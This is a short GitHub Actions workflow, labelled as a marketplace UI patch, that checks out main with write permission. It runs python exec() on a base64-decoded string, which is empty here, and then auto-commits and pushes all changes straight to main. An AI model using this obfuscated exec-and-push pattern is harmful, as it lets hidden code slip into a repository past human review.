name: Marketplace new product UI
on:
  push:
    paths:
      - .github/workflows/marketplace-new-product-ui.yml
permissions:
  contents: write
jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: main
      - name: Apply UI patch
        run: python -c "import base64;exec(base64.b64decode(''))"
      - name: Check JavaScript syntax
        run: node --check /tmp/app.js
      - name: Commit UI improvement
        run: |
          git config user.name github-actions[bot]
          git config user.email 41898282+github-actions[bot]@users.noreply.github.com
          git add -A
          git commit -m "Add direct product creation from marketplace orders"
          git push origin HEAD:main
